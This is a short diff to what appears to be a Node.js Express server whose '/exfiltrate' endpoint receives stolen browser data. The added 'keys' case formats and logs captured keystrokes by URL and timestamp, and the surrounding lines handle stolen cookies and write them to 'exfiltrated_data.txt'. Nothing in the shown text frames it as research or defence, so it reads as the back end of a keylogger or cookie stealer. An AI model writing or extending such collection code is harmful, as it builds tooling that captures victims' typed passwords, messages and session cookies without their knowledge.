@@ -46,11 +46,21 @@ app.post('/exfiltrate', (req, res) => {
             // Save Cookies to a file
             break;
 
-//        case 'cookies':
-//            console.log(`Received Cookies: ${data}`);
-//            // Save Cookies to a file
-//            fs.appendFileSync('exfiltrated_data.txt', `Cookies: ${data}\n\n`);
-//            break;
+        case 'keys':
+            let output = "";
+
+            for (const [url, entries] of Object.entries(data)) {
+                output += `${url}:\n`;
+                entries.forEach(entry => {
+                    output += `[${entry.timestamp}] ${entry.text}\n`;
+                });
+                output += "\n"; // Add space between different URLs
+            }
+
+            console.log(output); // Output the formatted keystroke data
+            break;
+
+
 //        default:
 //            console.log(`Unknown type: ${type}`);
 //            fs.appendFileSync('exfiltrated_data.txt', `Unknown Type: ${type}\n\n`);
